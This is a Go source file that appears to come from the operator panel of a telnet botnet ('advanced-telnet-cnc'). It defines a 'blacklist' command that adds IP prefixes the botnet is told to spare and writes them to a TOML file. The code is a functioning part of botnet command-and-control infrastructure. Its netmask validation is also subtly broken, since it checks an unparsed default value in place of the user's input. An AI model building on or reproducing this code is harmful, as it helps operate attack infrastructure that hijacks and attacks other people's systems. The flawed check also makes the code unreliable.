package subcommands

import (
	"advanced-telnet-cnc/packages/simpleconfig"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"
)

func init() {
	command.Subcommand("blacklist", &command.SubCommand{
		Aliases:   []string{"add", "create"},
		Arguments: []command.Argument{{"host", true}},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			targets := strings.Split(args[0], ",")
			for _, target := range targets {
				prefix := ""
				netmask := uint8(32)
				targetInfo := strings.Split(target, "/")
				if len(targetInfo) == 0 {
					return session.CmdError(errors.New("blank host"))
				}

				prefix = targetInfo[0]

				if len(targetInfo) == 2 {
					netmaskTmp, err := strconv.Atoi(targetInfo[1])
					if err != nil || netmask > 32 || netmask < 0 {
						return session.CmdError(errors.New("invalid netmask"))
					}

					netmask = uint8(netmaskTmp)
				}

				if len(targetInfo) > 2 {
					return session.CmdError(errors.New("too many netmasks (duplicated /?)"))
				}

				ip := net.ParseIP(prefix)
				if ip == nil {
					return session.CmdError(errors.New("invalid ip address"))
				}

				if config.Blacklist.IsBlacklisted(binary.BigEndian.Uint32(ip[12:]), netmask) {
					return session.CmdError(errors.New("already blacklisted"))
				}

				config.Blacklist.Blacklist = append(config.Blacklist.Blacklist, &config.Target{
					Prefix:  ip.String(),
					Netmask: netmask,
				})
			}

			err := simpleconfig.Encode("assets/blacklist.toml", true, config.Blacklist)
			if err != nil {
				return session.CmdError(err)
			}

			return session.Println(config.Green, "Successfully blacklisted hosts. The blacklist now contains ", len(config.Blacklist.Blacklist), " hosts.")
		},
	})
}
